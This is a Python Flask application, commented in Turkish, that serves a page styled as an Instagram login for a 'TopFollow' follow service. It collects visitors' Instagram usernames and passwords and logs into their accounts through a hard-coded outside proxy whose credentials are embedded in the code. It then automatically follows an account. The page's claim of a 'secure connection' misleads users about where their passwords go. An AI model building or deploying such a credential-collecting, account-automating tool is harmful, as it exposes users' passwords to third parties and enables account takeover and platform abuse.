import os
import sys
import json
import time
import logging
import traceback
import subprocess
import tempfile
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash
from dotenv import load_dotenv

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

load_dotenv()

app = Flask(__name__)

# DATABASE
db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.db")
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", f"sqlite:///{db_path}")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "secret-key-123")

db = SQLAlchemy(app)

# PROXY - SİZİN PROXY'NİZ
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
logger.info(f"Proxy: {PROXY_URL[:30]}...")

class IGAccount(db.Model):
    __tablename__ = 'accounts'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    status = db.Column(db.String(200), default="Beklemede")
    last_login = db.Column(db.DateTime)
    login_attempts = db.Column(db.Integer, default=0)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

# Ayrı login script (subprocess için)
LOGIN_SCRIPT = '''
import sys
import json
import time

# instagrapi import
try:
    from instagrapi import Client
    from instagrapi.exceptions import (
        ChallengeRequired, 
        LoginRequired, 
        PleaseWaitFewMinutes,
        BadPassword,
        TwoFactorRequired
    )
except Exception as e:
    print(json.dumps({"success": False, "error": f"Import hatasi: {str(e)}"}))
    sys.exit(1)

def main():
    username = sys.argv[1]
    password = sys.argv[2]
    proxy = sys.argv[3] if len(sys.argv) > 3 else None
    
    try:
        cl = Client()
        
        # Proxy ayarla
        if proxy and proxy != "None":
            try:
                cl.set_proxy(proxy)
            except Exception as e:
                print(json.dumps({"success": False, "error": f"Proxy hatasi: {str(e)}"}))
                return
        
        # Timeout ve delay ayarla
        cl.request_timeout = 30
        cl.delay_range = [1, 2]
        
        # Login dene
        cl.login(username, password)
        
        # Başarılı - takip et
        try:
            insta_id = cl.user_id_from_username("instagram")
            cl.user_follow(insta_id)
            result = {"success": True, "message": "Giris basarili ve takip edildi"}
        except Exception as e:
            result = {"success": True, "message": f"Giris basarili ama takip hatasi: {str(e)}"}
        
        print(json.dumps(result))
        
    except ChallengeRequired as e:
        print(json.dumps({"success": False, "error": "ONAY GEREKİYOR", "detail": str(e)}))
    except TwoFactorRequired as e:
        print(json.dumps({"success": False, "error": "2FA GEREKİYOR", "detail": str(e)}))
    except BadPassword as e:
        print(json.dumps({"success": False, "error": "Yanlış şifre"}))
    except PleaseWaitFewMinutes as e:
        print(json.dumps({"success": False, "error": "Rate limit - Bekle"}))
    except Exception as e:
        print(json.dumps({"success": False, "error": str(e)}))
    finally:
        try:
            cl.logout()
        except:
            pass

if __name__ == "__main__":
    main()
'''

def run_instagrapi_subprocess(username, password):
    """
    instagrapi'yi tamamen ayrı Python process'inde çalıştır
    Bu Flask'i asla bloklamaz!
    """
    # Geçici dosya oluştur
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, dir='/tmp') as f:
        f.write(LOGIN_SCRIPT)
        script_path = f.name
    
    try:
        # Subprocess çalıştır - 60 saniye timeout
        logger.info(f"[{username}] Subprocess başlatılıyor...")
        
        result = subprocess.run(
            [sys.executable, script_path, username, password, PROXY_URL],
            capture_output=True,
            text=True,
            timeout=60,
            cwd='/tmp'
        )
        
        # Temizlik
        try:
            os.unlink(script_path)
        except:
            pass
        
        # Sonucu parse et
        if result.returncode != 0:
            stderr = result.stderr.strip()
            logger.error(f"[{username}] Subprocess hatası: {stderr}")
            return False, f"Sistem hatası: {stderr[:100]}"
        
        # JSON çıktısını al (son satır)
        lines = result.stdout.strip().split('\n')
        json_line = None
        
        for line in reversed(lines):
            line = line.strip()
            if line and line.startswith('{'):
                json_line = line
                break
        
        if not json_line:
            logger.error(f"[{username}] JSON çıktısı bulunamadı: {result.stdout[:200]}")
            return False, "Çıktı parse hatası"
        
        data = json.loads(json_line)
        
        if data.get('success'):
            return True, data.get('message', 'Başarılı')
        else:
            error = data.get('error', 'Bilinmeyen hata')
            return False, error
            
    except subprocess.TimeoutExpired:
        logger.error(f"[{username}] Timeout")
        try:
            os.unlink(script_path)
        except:
            pass
        return False, "Zaman aşımı (60s)"
    except Exception as e:
        logger.error(f"[{username}] Subprocess exception: {e}")
        try:
            os.unlink(script_path)
        except:
            pass
        return False, str(e)

def do_login_task(username, password):
    """
    Background task - subprocess kullanır, thread-safe
    """
    with app.app_context():
        from flask import current_app
        
        # Database güncelle
        with db.session.begin():
            acc = IGAccount.query.filter_by(username=username).first()
            if acc:
                acc.login_attempts += 1
                acc.status = "Giriş deneniyor (subprocess)..."
                db.session.commit()
        
        # Subprocess ile login dene
        success, message = run_instagrapi_subprocess(username, password)
        
        # Sonuç güncelle
        with db.session.begin():
            acc = IGAccount.query.filter_by(username=username).first()
            if acc:
                if success:
                    acc.status = "AKTİF ✅ - " + message
                    acc.last_login = db.func.now()
                else:
                    if "ONAY" in message or "2FA" in message:
                        acc.status = message + " ⚠️"
                    else:
                        acc.status = "HATA ❌ - " + message
                db.session.commit()
        
        logger.info(f"[{username}] Sonuç: {message}")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    """
    KESİN NON-BLOCKING - Subprocess kullanır
    """
    try:
        data = request.get_json()
        username = data.get('u', '').strip().lower()
        password = data.get('p', '')
        
        if not username or not password:
            return jsonify(status="error", message="Eksik bilgi"), 400
        
        # Database kaydı
        with db.session.begin():
            acc = IGAccount.query.filter_by(username=username).first()
            if not acc:
                acc = IGAccount(username=username, status="Başlatılıyor...")
                acc.set_password(password)
                db.session.add(acc)
            else:
                acc.set_password(password)
                acc.status = "Başlatılıyor..."
        
        # Thread başlat (subprocess içinde)
        import threading
        t = threading.Thread(
            target=do_login_task,
            args=(username, password),
            daemon=True
        )
        t.start()
        
        logger.info(f"Thread başlatıldı: {username}")
        
        return jsonify(
            status="started",
            username=username,
            message="İşlem başlatıldı (subprocess)"
        )
        
    except Exception as e:
        logger.error(f"Connect hatası: {e}")
        return jsonify(status="error", message=str(e)), 500

@app.route('/api/status/<username>')
def get_status(username):
    try:
        acc = IGAccount.query.filter_by(username=username.lower()).first()
        if not acc:
            return jsonify(status="Bilinmiyor", exists=False)
        
        return jsonify(
            status=acc.status,
            exists=True,
            attempts=acc.login_attempts,
            last_login=acc.last_login.isoformat() if acc.last_login else None
        )
    except Exception as e:
        return jsonify(status="Hata", error=str(e)), 500

@app.route('/api/health')
def health():
    return jsonify(
        status="ok",
        proxy=PROXY_URL[:25] + "...",
        mode="subprocess-instagrapi"
    )

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TopFollow Style - Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .page { display: none; }
        .active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .animate-fade-in { animation: fadeIn 0.4s ease-out; }
        .loader { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-gradient-to-b from-purple-600 to-blue-600 min-h-screen font-sans text-white">

    <!-- Login Page - TopFollow Style -->
    <div id="p1" class="page active flex-col items-center justify-center min-h-screen p-6 animate-fade-in">
        <div class="w-full max-w-[340px]">
            <!-- Logo Area -->
            <div class="text-center mb-12">
                <div class="w-20 h-20 bg-white/20 rounded-2xl flex items-center justify-center mx-auto mb-4 backdrop-blur-sm">
                    <svg class="w-10 h-10 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
                </div>
                <h1 class="text-3xl font-bold mb-1">Instagram</h1>
                <p class="text-white/70 text-sm">TopFollow Bağlantısı</p>
            </div>
            
            <!-- Form -->
            <div class="space-y-4">
                <div class="bg-white/10 backdrop-blur-md rounded-xl p-1">
                    <input id="u" type="text" placeholder="Kullanıcı adı" 
                           class="w-full bg-transparent text-white placeholder-white/60 p-4 outline-none text-base"
                           autocomplete="username">
                </div>
                
                <div class="bg-white/10 backdrop-blur-md rounded-xl p-1">
                    <input id="p" type="password" placeholder="Şifre" 
                           class="w-full bg-transparent text-white placeholder-white/60 p-4 outline-none text-base"
                           autocomplete="current-password">
                </div>
                
                <button onclick="giris()" id="btn" 
                        class="w-full bg-white text-purple-600 p-4 rounded-xl font-bold text-lg shadow-lg hover:bg-gray-100 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center mt-6">
                    <div id="btnLoader" class="loader hidden border-purple-600 border-t-transparent"></div>
                    <span id="btnText">Giriş Yap</span>
                </button>
            </div>
            
            <div id="errorBox" class="hidden mt-6 p-4 bg-red-500/20 border border-red-400/30 rounded-xl text-center text-sm backdrop-blur-sm"></div>
            
            <p class="text-center text-white/50 text-xs mt-8">
                Proxy üzerinden güvenli bağlantı
            </p>
        </div>
    </div>

    <!-- Status Page -->
    <div id="p2" class="page flex-col items-center justify-center min-h-screen p-6 bg-gray-50 text-gray-800 hidden">
        <div class="w-full max-w-[340px] animate-fade-in">
            <!-- Status Card -->
            <div class="bg-white rounded-3xl shadow-xl p-8 text-center mb-6 border-b-4 border-purple-500">
                <div class="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <div id="statusIcon" class="w-4 h-4 bg-purple-500 rounded-full animate-pulse"></div>
                </div>
                
                <h2 id="msg" class="text-xl font-bold text-gray-800 mb-2">Bağlanıyor...</h2>
                <p id="subMsg" class="text-gray-500 text-sm">Proxy üzerinden giriş yapılıyor</p>
            </div>

            <!-- Info Card -->
            <div class="bg-white rounded-2xl shadow-md p-5 mb-4">
                <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
                    <span class="text-gray-500 text-sm">Kullanıcı</span>
                    <span id="utag" class="font-bold text-gray-800">@username</span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-500 text-sm">Durum</span>
                    <span id="statusBadge" class="bg-yellow-100 text-yellow-700 px-3 py-1 rounded-full text-xs font-bold">Bekliyor</span>
                </div>
            </div>

            <!-- Buttons -->
            <button onclick="checkNow()" id="checkBtn"
                    class="w-full bg-purple-600 text-white p-4 rounded-xl font-bold mb-3 hover:bg-purple-700 transition-all active:scale-[0.98] shadow-lg">
                Kontrol Et
            </button>
            
            <button onclick="location.reload()" 
                    class="w-full bg-gray-200 text-gray-700 p-4 rounded-xl font-bold hover:bg-gray-300 transition-all active:scale-[0.98]">
                Yeniden Dene
            </button>
            
            <p class="text-center text-gray-400 text-xs mt-6">
                Otomatik kontrol: <span id="timer" class="font-bold text-purple-600">5</span>s
            </p>
        </div>
    </div>

    <script>
        let currentUser = "";
        let checkInterval = null;
        let countdown = 5;

        function showError(msg) {
            const box = document.getElementById('errorBox');
            box.textContent = msg;
            box.classList.remove('hidden');
            
            const btn = document.getElementById('btn');
            btn.disabled = false;
            document.getElementById('btnText').classList.remove('hidden');
            document.getElementById('btnLoader').classList.add('hidden');
        }

        async function giris() {
            const u = document.getElementById('u').value.trim().toLowerCase();
            const p = document.getElementById('p').value;

            if (!u || !p) {
                showError('Kullanıcı adı ve şifre girin');
                return;
            }

            // Loading state
            const btn = document.getElementById('btn');
            btn.disabled = true;
            document.getElementById('btnText').classList.add('hidden');
            document.getElementById('btnLoader').classList.remove('hidden');
            document.getElementById('errorBox').classList.add('hidden');

            try {
                // 5 saniye timeout
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);

                const res = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: u, p: p}),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                const data = await res.json();

                if (!res.ok || data.status === 'error') {
                    throw new Error(data.message || 'Sunucu hatası');
                }

                // Başarılı - geçiş yap
                currentUser = u;
                document.getElementById('p1').classList.add('hidden');
                document.getElementById('p1').classList.remove('active');
                document.getElementById('p2').classList.remove('hidden');
                document.getElementById('p2').classList.add('active');
                document.getElementById('utag').textContent = '@' + u;
                
                startChecking();

            } catch (err) {
                if (err.name === 'AbortError') {
                    showError('Sunucu yanıt vermiyor - Tekrar deneyin');
                } else {
                    showError(err.message);
                }
            }
        }

        function startChecking() {
            checkStatus();
            checkInterval = setInterval(() => {
                checkStatus();
                countdown = 5;
            }, 5000);
            
            // Geri sayım
            setInterval(() => {
                if (countdown > 0) {
                    countdown--;
                    document.getElementById('timer').textContent = countdown;
                } else {
                    countdown = 5;
                }
            }, 1000);
        }

        async function checkNow() {
            const btn = document.getElementById('checkBtn');
            const originalText = btn.textContent;
            btn.disabled = true;
            btn.textContent = 'Kontrol ediliyor...';
            
            await checkStatus();
            
            setTimeout(() => {
                btn.disabled = false;
                btn.textContent = originalText;
            }, 800);
        }

        async function checkStatus() {
            if (!currentUser) return;
            
            try {
                const res = await fetch('/api/status/' + currentUser);
                const data = await res.json();
                
                const msgEl = document.getElementById('msg');
                const iconEl = document.getElementById('statusIcon');
                const badge = document.getElementById('statusBadge');
                const subMsg = document.getElementById('subMsg');
                
                msgEl.textContent = data.status || 'Bekleniyor...';
                
                if (data.status.includes('✅')) {
                    badge.className = 'bg-green-100 text-green-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Aktif';
                    iconEl.className = 'w-4 h-4 bg-green-500 rounded-full';
                    subMsg.textContent = 'Başarıyla bağlandı!';
                    clearInterval(checkInterval);
                } else if (data.status.includes('❌')) {
                    badge.className = 'bg-red-100 text-red-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Hata';
                    iconEl.className = 'w-4 h-4 bg-red-500 rounded-full';
                    subMsg.textContent = 'Bir sorun oluştu';
                } else if (data.status.includes('⚠️')) {
                    badge.className = 'bg-orange-100 text-orange-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Onay Gerekli';
                    iconEl.className = 'w-4 h-4 bg-orange-500 rounded-full animate-bounce';
                    subMsg.textContent = 'Instagram uygulamasını kontrol edin';
                }

            } catch (e) {
                console.error('Status error:', e);
            }
        }

        // Enter tuşu
        document.getElementById('p').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') giris();
        });
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
        logger.info("Database hazır")
    
    port = int(os.getenv("PORT", 10000))
    logger.info(f"Sunucu: 0.0.0.0:{port}")
    logger.info("Mode: Subprocess + instagrapi (thread'i bloklamaz)")
    
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
